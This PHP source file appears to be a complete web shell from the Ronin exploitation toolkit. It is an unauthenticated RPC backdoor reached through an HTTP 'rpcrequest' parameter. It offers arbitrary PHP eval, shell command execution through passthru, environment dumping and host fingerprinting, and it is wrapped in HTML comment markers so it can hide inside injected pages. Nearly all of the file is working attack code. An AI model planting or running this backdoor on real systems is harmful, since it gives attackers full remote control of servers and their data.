// <!-- <?php
/*
 * Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
 *  environments.
 *
 * Copyright (c) 2007-2009
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
/**
 * PHP MsgPack encode/decode
 * http://code.google.com/p/msgpack-php
 * MsgPack: http://msgpack.sourceforge.net/
 *
 * Author: S.Schwuchow http://www.Schottenland.de
 *
 * @TODO check signed int >16bit
 * @TODO raise more warning of php incompatiblities
 * @TODO check float twice
 * @TODO build a big and complex test binaryString from other implementation and test against it
 *
 *
 */
class MsgPack_Coder {

	// fixed length
	const VALUE_SCALAR_NULL = 192; // xC0
	const VALUE_SCALAR_FALSE = 194; // xC2
	const VALUE_SCALAR_TRUE = 195; // xC3
	const VALUE_SCALAR_FLOAT = 202; // xCA
	const VALUE_SCALAR_DOUBLE = 203; // xCB
	// x00-x7f - integer 0-127 positive fixnum
	const VALUE_INT_FIX_NEGATIVE = 224; // 111XXXXX xE0-xFF -1 - -32 // unclear 11100000 = -1 ??
	const VALUE_INT_UNSIGNED_8 = 204; // xCC + 1 byte
	const VALUE_INT_UNSIGNED_16 = 205; // xCD + 2 byte
	const VALUE_INT_UNSIGNED_32 = 206; // xCE + 4 byte
	const VALUE_INT_UNSIGNED_64 = 207; // xCF + 8 byte
	const VALUE_INT_SIGNED_8 = 208; // xD0 + 1 byte
	const VALUE_INT_SIGNED_16 = 209; // xD1 + 2 byte
	const VALUE_INT_SIGNED_32 = 210; // xD2 + 4 byte
	const VALUE_INT_SIGNED_64 = 211; // xD3 + 8 byte
	// raw bytes
	const VALUE_RAW_FIX = 160; // xA0 101XXXXX + max 31 byte len
	const VALUE_RAW_16 = 218; // xDA save raw bytes up to (2^16)-1 bytes.
	const VALUE_RAW_32 = 219; // xDB save raw bytes up to (2^32)-1 bytes.
	// container
	const VALUE_LIST_FIX = 144; // x90 1001XXXX save an array up to 15 elements. 
	const VALUE_LIST_16 = 220; // xDC save an array up to (2^16)-1 elements. 
	const VALUE_LIST_32 = 221; // xDD save an array up to (2^32)-1 elements. 
	const VALUE_MAP_FIX = 128; // x80 1000XXXX save a map up to 15 elements. odd elements are key and next element of the key is its associate value.
	const VALUE_MAP_16 = 222; // xDE save a map up to (2^16)-1 elements. odd elements are key and next element of the key is its associate value.
	const VALUE_MAP_32 = 223; // xDF save a map up to (2^32)-1 elements. odd elements are key and next element of the key is its associate value.

	/**
	 * encode a PHP-Variable to binary MsgPack String
	 *
	 * @static
	 * @param mixed $message
	 * @return string
	 */
	static public function encode($message) {
		$messagePack = null;
		if( $message===null ) {
			$messagePack.= chr(self::VALUE_SCALAR_NULL);
		} elseif( $message===true ) {
			$messagePack.= chr(self::VALUE_SCALAR_TRUE);
		} elseif( $message===false ) {
			$messagePack.= chr(self::VALUE_SCALAR_FALSE);
		} elseif( is_double($message) ) {
			$binary = pack("d", $message);
			if( strlen($binary)==4 ) {
				$messagePack.= chr(self::VALUE_SCALAR_FLOAT).$binary;
			} elseif( strlen($binary)==8 ) {
				$messagePack.= chr(self::VALUE_SCALAR_DOUBLE).$binary;
			} else {
				user_error(__METHOD__.': unexpected pack() result-len!', E_USER_ERROR);
				$messagePack.= self::VALUE_SCALAR_NULL;
			}
		} elseif( is_float($message) ) {
			// it look like a float is always a double...
			$binary = pack("f", $message);
			if( strlen($binary)==4 ) {
				$messagePack.= chr(self::VALUE_SCALAR_FLOAT).$binary;
			} elseif( strlen($binary)==8 ) {
				$messagePack.= chr(self::VALUE_SCALAR_DOUBLE).$binary;
			} else {
				user_error(__METHOD__.': unexpected pack() result-len!', E_USER_ERROR);
				$messagePack.= self::VALUE_SCALAR_NULL;
			}
		} elseif( is_int($message) ) {
			if( $message<0 ) {
				if( $message>=-32 ) {
					$messagePack.= pack('c',$message);
				} elseif( $message>=-128 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_8);
					$messagePack.= pack('c',$message); // signed char
				} elseif( $message>=-65535 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_16);
					$messagePack.= self::getNibblesFromInt(65536+$message, 2); // FF FF = -1
				} elseif( $message>=-pow(2,32)-1 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_32);
					$messagePack.= self::getNibblesFromInt(abs($message), 4);
				} else {
					$messagePack.= chr(self::VALUE_INT_SIGNED_64);
					$messagePack.= self::getNibblesFromInt(abs($message), 8);
				}
			} elseif( $message<=127 ) {
				$messagePack.= chr($message);
			} elseif( $message<=255 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_8);
				$messagePack.= self::getNibblesFromInt($message, 1);
			} elseif( $message<=65535 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_16);
				$messagePack.= self::getNibblesFromInt($message, 2);
			} elseif( $message<=pow(2,32)-1 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_32);
				$messagePack.= self::getNibblesFromInt($message, 4);
			} else {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_64);
				$messagePack.= self::getNibblesFromInt($message, 8);
			}
		} elseif( is_string($message) ) {
			$len = strlen($message);
			if( $len<=31 ) {
				$messagePack.= chr(self::VALUE_RAW_FIX+$len);
			} elseif( $len<=65535 ) { // 2^16-1
				$messagePack.= chr(self::VALUE_RAW_16);
				$messagePack.= self::getNibblesFromInt($len, 2);
			} else {
				$messagePack.= chr(self::VALUE_RAW_32);
				$messagePack.= self::getNibblesFromInt($len, 4);
			}
			$messagePack.= $message;
		} elseif( is_array($message) ) {
			$assoc = false;
			$index = 0;
			foreach( $message as $key=>$value ) {
				if( $key!=$index++ ) { // key ist nicht index
					$assoc = true;
					break;
				}
			}
			$count = count($message);
			if( $count<=15 ) {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_FIX+$count);
				} else {
					$messagePack.= chr(self::VALUE_LIST_FIX+$count);
				}
			} elseif( $count<65536) {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_16);
				} else {
					$messagePack.= chr(self::VALUE_LIST_16);
				}
				$messagePack.= self::getNibblesFromInt($count, 2);
			} else {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_32);
				} else {
					$messagePack.= chr(self::VALUE_LIST_32);
				}
				$messagePack.= self::getNibblesFromInt($count, 4);
			}
			foreach( $message as $key=>$value ) {
				if( $assoc ) {
					$messagePack.= self::encode($key);
				}
				$messagePack.= self::encode($value);
			}
		} else {
			$messagePack = 'encoding failed! messagepack:'.$messagePack;
		}
		return $messagePack;
	}



	/**
	 * decode a MsgPack to php-Variable
	 * the affected bytes will be removed
	 *
	 * @static
	 * @param string $messagePack
	 * @return mixed
	 */
	static public function decode(&$messagePack) {
		$message = null;
		$messageByte = ord(substr($messagePack,0,1));
		$messagePack = substr($messagePack,1);
		if( $messageByte==self::VALUE_SCALAR_NULL ) {
			$message = null;
		} elseif( $messageByte==self::VALUE_SCALAR_TRUE ) {
			$message = true;
		} elseif( $messageByte==self::VALUE_SCALAR_FALSE ) {
			$message = false;
		} elseif( $messageByte==self::VALUE_SCALAR_DOUBLE ) {
			$unpack = unpack('d', $messagePack);
			$message = $unpack[1];
			$messagePack = substr($messagePack, 8);
		} elseif( $messageByte==self::VALUE_SCALAR_FLOAT ) {
			// it seem that unpack('f'... returns a double, so the result can be different from source e.g. for 1.3 (float) = 1.29999995232 (double)
			$unpack = unpack('f', $messagePack);
			$message = $unpack[1];
			$messagePack = substr($messagePack, 4);
		} elseif( $messageByte<=127 ) {
			$message = $messageByte;
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_8 ) {
			$message = self::getIntFromMessagePack($messagePack, 1);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_16 ) {
			$message = self::getIntFromMessagePack($messagePack, 2);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_32 ) {
			$message = self::getIntFromMessagePack($messagePack, 4);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_64 ) {
			$message = self::getIntFromMessagePack($messagePack, 8);
		} elseif( $messageByte>=self::VALUE_INT_FIX_NEGATIVE AND $messageByte<=self::VALUE_INT_FIX_NEGATIVE+31) {
			$message = -256+$messageByte;
		} elseif( $messageByte==self::VALUE_INT_SIGNED_8 ) {
			$message = -256+self::getIntFromMessagePack($messagePack, 1);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_16 ) {
			$message = -65536+self::getIntFromMessagePack($messagePack, 2);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_32 ) {
			$message = 0-self::getIntFromMessagePack($messagePack, 4);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_64 ) {
			$message = 0-self::getIntFromMessagePack($messagePack, 8);
		} elseif( $messageByte>=self::VALUE_RAW_FIX AND $messageByte<=self::VALUE_RAW_FIX+31) {
			$len = $messageByte-self::VALUE_RAW_FIX;
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte==self::VALUE_RAW_16 ) {
			$len = self::getIntFromMessagePack($messagePack,2);
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte==self::VALUE_RAW_32 ) {
			$len = self::getIntFromMessagePack($messagePack,4);
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte>=self::VALUE_LIST_FIX AND $messageByte<=self::VALUE_LIST_FIX+15) {
			$count = $messageByte-self::VALUE_LIST_FIX;
			$message = self::getArrayFromMessagesPack($messagePack, $count, false);
		} elseif( $messageByte>=self::VALUE_MAP_FIX AND $messageByte<=self::VALUE_MAP_FIX+15) {
			$count = $messageByte-self::VALUE_MAP_FIX;
			$message = self::getArrayFromMessagesPack($messagePack, $count, true);
		} elseif( $messageByte==self::VALUE_LIST_16 ) {
			$len = self::getIntFromMessagePack($messagePack, 2);
			$message = self::getArrayFromMessagesPack($messagePack, $len, false);
		} elseif( $messageByte==self::VALUE_LIST_32 ) {
			$len = self::getIntFromMessagePack($messagePack, 4);
			$message = self::getArrayFromMessagesPack($messagePack, $len, false);
		} elseif( $messageByte==self::VALUE_MAP_16 ) {
			$len = self::getIntFromMessagePack($messagePack, 2);
			$message = self::getArrayFromMessagesPack($messagePack, $len, true);
		} elseif( $messageByte==self::VALUE_MAP_32 ) {
			$len = self::getIntFromMessagePack($messagePack, 4);
			$message = self::getArrayFromMessagesPack($messagePack, $len, true);
		} else {
			$message = 'resolve Failed';
		}
		return $message;
	}

	/**
	 * dump a binary String for debugging
	 * @static
	 * @param string $messagePack
	 * @return string
	 */
	static public function hexDump($messagePack) {
		$out = '';
		for($i=0; $i<strlen($messagePack); $i++) {
			$out.= ' '.dechex(ord($messagePack[$i]));
		}
		return $out;
	}

	/**
	 * build binary Nibbles for PHP-int
	 * @static
	 * @param int $value
	 * @param int $len
	 * @return string
	 */
	static protected function getNibblesFromInt($intValue, $len) {
		$result = '';
		for($i=1; $i<=$len; $i++ ) {
			$result = chr($intValue % 256).$result;
			$intValue = $intValue/256;
		}
		return $result;
	}
	/**
	 * get an PHP-Int from binary String
	 * the affected bytes will by removed
	 *
	 * @static
	 * @param string $messagePack
	 * @param int $len
	 * @return int
	 */
	static protected function getIntFromMessagePack(&$messagePack, $len) {
		$int = 0;
		for($i=0; $i<$len; $i++ ) {
			$int += ord(substr($messagePack,$len-1-$i,1)) * pow(2,$i*8);
		}
		$messagePack = substr($messagePack,$len);
		return $int;
	}

	/**
	 * get an PHP-Array from binary string
	 * the affected bytes will be removed
	 *
	 * @static
	 * @param string $messagePack
	 * @param int $count
	 * @param bool $assoc
	 * @return array
	 */
#segfault	static protected function getArrayFromMessagesPack(string &$messagePack, int $count, boolean $assoc) {
	static protected function getArrayFromMessagesPack(&$messagePack, $count, $assoc) {
		$message = array();
		for( $i=0; $i<$count; $i++ ) {
			if( $assoc ) {
				$message[self::decode($messagePack)] = self::decode($messagePack);
			} else {
				$message[] = self::decode($messagePack);
			}
		}
		return $message;
	}

}

class RPCServer
{
  var $methods;

  var $services;

  function RPCServer()
  {
    $this->methods = array();
    $this->services = array();
  }

  function error_msg($message)
  {
    return array(
      'type' => 'error',
      'message' => $message
    );
  }

  function return_msg($state,$output,$return_value)
  {
    return array(
      'type' => 'return',
      'state' => $state,
      'output' => $output,
      'return_value' => $return_value,
    );
  }

  function load_state($state)
  {
    foreach ($state as $name => $values)
    {
      if (isset($this->services[$name]))
      {
        foreach ($this->services[$name]->persistant as $var)
        {
          if (isset($values[$var]))
          {
            $this->services[$name]->$var = $values[$var];
          }
        }
      }
    }
  }

  function register_method($name,$function)
  {
    $this->methods[$name] = $function;
  }

  function register_service($name,&$service)
  {
    $this->services[$name] =& $service;

    foreach ($service->methods as $rpc_name => $method)
    {
      $this->register_method("{$name}.{$rpc_name}",array(&$service, $method));
    }
  }

  function call_method($request)
  {
    if (!is_array($request))
    {
      return $this->error_msg("Invalid Request message");
    }

    if (!$request['name'])
    {
      return $this->error_msg("Invalid Method Call");
    }

    $method_name = $request['name'];

    if (!$this->methods[$method_name])
    {
      return $this->error_msg("Unknown method: {$method_name}");
    }

    $state = $request['state'];

    if ($state)
    {
      $this->load_state($state);
    }

    $func = $this->methods[$method_name];
    $arguments = $request['arguments'];

    if (!$arguments)
    {
      $arguments = array();
    }

    ob_start();

    $return_value = call_user_func_array($func,$arguments);

    $output = ob_get_contents();
    ob_end_flush();

    $updated_state = $this->save_state();

    return $this->return_msg($updated_state,$output,$return_value);
  }

  function rpc_services($method)
  {
    return array_keys($this->services);
  }

  function save_state()
  {
    $state = array();

    foreach ($this->services as $name => $service)
    {
      $state[$name] = array();

      foreach ($service->persistant as $var)
      {
        $state[$name][$var] = $service->$var;
      }
    }

    return $state;
  }
}

class Service
{
  var $methods;

  var $persistant;

  function Service()
  {
    $this->methods = array();
    $this->persistant = array();
  }

  function is_windows()
  {
    return substr(PHP_OS, 0, 3) == 'WIN';
  }
}

class ConsoleService extends Service
{
  var $includes;

  function ConsoleService()
  {
    $this->includes = array();
    $this->methods = array(
      'invoke' => 'rpc_invoke',
      'eval' => 'rpc_eval',
      'inspect' => 'rpc_inspect'
    );

    $this->persistant = array('includes');
  }

  function rpc_invoke($name,$arguments)
  {
    $call_arguments = array();

    if ($arguments != null)
    {
      foreach(array_keys($arguments) as $index)
      {
        $call_arguments[$index] = "\$arguments[{$index}]";
      }
    }

    $call_string = "return {$name}(" . join(", ", $call_arguments) . ");";

    $ret = eval($call_string);

    if (($name == 'include' || $name == 'require') && $ret != false)
    {
      $this->includes[] = $arguments[0];
    }

    return $ret;
  }

  function rpc_eval($code)
  {
    if ($code[strlen($code) - 1] != ';')
    {
      $code .= ';';
    }

    return eval('return ' . $code);
  }

  function rpc_inspect($code)
  {
    $ret = $this->rpc_eval($code);

    ob_start();
    print_r($ret);
    $output = ob_get_contents();
    ob_end_clean();

    return $output;
  }
}

class ShellService extends Service
{
  var $cwd;

  var $env;

  function ShellService()
  {
    $this->cwd = getcwd();
    $this->env = array();

    $this->methods = array(
      'exec' => 'rpc_exec',
      'cd' => 'rpc_cd',
      'cwd' => 'rpc_cwd',
      'env' => 'rpc_env',
      'getenv' => 'rpc_getenv',
      'setenv' => 'rpc_setenv'
    );

    $this->persistant = array('cwd', 'env');
  }

  function format($obj)
  {
    if (is_array($obj))
    {
      $formatted = array();

      foreach($obj as $value)
      {
        $formatted[] = $this->format($value);
      }

      return join(' ', $formatted);
    }
    else if ($obj == null)
    {
      return '';
    }

    return "{$obj}";
  }

  function exec_output($command)
  {
    ob_start();

    passthru($command);

    $output = ob_get_contents();
    ob_end_clean();

    return split("\n",rtrim($output,"\n\r"));
  }

  function load_env()
  {
    if ($this->is_windows())
    {
      $command = 'set';
    }
    else
    {
      $command = 'env';
    }

    $this->env = array();

    foreach ($this->exec_output($command) as $line)
    {
      list($name, $value) = explode('=', $line, 2);
      $this->env[$name] = $value;
    }
  }

  function rpc_cwd()
  {
    return $this->cwd;
  }

  function rpc_cd($new_cwd)
  {
    if ($new_cwd[0] != DIRECTORY_SEPARATOR)
    {
      $new_cwd = $this->cwd . DIRECTORY_SEPARATOR . $new_cwd;
    }

    $new_cwd = realpath($new_cwd);

    if (file_exists($new_cwd))
    {
      $this->cwd = $new_cwd;
      return true;
    }

    return false;
  }

  function rpc_env()
  {
    return $this->env;
  }

  function rpc_getenv($key)
  {
    return $this->env[$key];
  }

  function rpc_setenv($key,$value)
  {
    return $this->env[$key] = $value;
  }

  function rpc_exec($program,$arguments=array())
  {
    $command = "cd {$this->cwd}; {$program}";

    if (count($arguments) > 0)
    {
      $command .= ' ' . $this->format($arguments);
    }

    $command .= '; pwd';

    $output = $this->exec_output($command);
    $this->cwd = array_pop($output);

    $output_string = '';

    foreach ($output as $line)
    {
      $output_string .= "{$line}\n";
    }

    return $output_string;
  }
}


function running($params=array()) { return true; }

function fingerprint($params=array())
{
  $profile = array(
    'os' => PHP_OS,
    'system_name' => php_uname('s'),
    'system_release' => php_uname('r'),
    'system_version' => php_uname('v'),
    'machine_type' => php_uname('m'),
    'host_name' => php_uname('n'),
    'php' => array(
      'prefix' => PHP_PREFIX,
      'bindir' => PHP_BINDIR,
      'config_dir' => PHP_CONFIG_FILE_SCAN_DIR,
      'datadir' => PHP_DATADIR,
      'extdir' => PHP_EXTENSION_DIR,
      'libdir' => PHP_LIBDIR,
      'lib_suffix' => PHP_SHLIB_SUFFIX,
      'loaded_exts' => get_loaded_extensions(),
      'server_api' => PHP_SAPI,
      'version' => array(
        'id' => PHP_VERSION_ID,
        'string' => PHP_VERSION,
        'major' => PHP_MAJOR_VERSION,
        'minor' => PHP_MINOR_VERSION,
        'release' => PHP_RELEASE_VERSION,
        'extra' => PHP_EXTRA_VERSION,
      )
    ),
    'cwd' => getcwd(),
    'disk_free_space' => disk_free_space('/'),
    'disk_total_space' => disk_total_space('/')
  );

  if (function_exists('posix_getuid')) { $profile['uid'] = posix_getuid(); }
  if (function_exists('posix_getgid')) { $profile['gid'] = posix_getgid(); }

  if (function_exists('php_ini_loaded_file'))
  {
    $profile['php']['loaded_ini_file'] = php_ini_loaded_file();
  }

  if (function_exists('php_ini_scanned_files'))
  {
    $profile['php']['ini_files'] = split(',',php_ini_scanned_files());
  }

  switch ($profile['php']['server_api'])
  {
  case 'apache':
    $profile['apache_version'] = apache_get_version();
    break;
  }

  return $profile;
}



if (isset($_REQUEST['rpcrequest']))
{
  $server = new RPCServer();
  $server->register_method('running', 'running');
  $server->register_method('fingerprint', 'fingerprint');
  $server->register_service('console', new ConsoleService());
  $server->register_service('shell', new ShellService());

  $request = $_REQUEST['rpcrequest'];
  $call = MsgPack_Coder::decode(base64_decode(rawurldecode($request)));
  $return_value = $server->call_method($call);
  $response = base64_encode(MsgPack_Coder::encode($return_value));

  echo("<rpc-response>{$response}</rpc-response>");
  exit;
}
// ?> -->


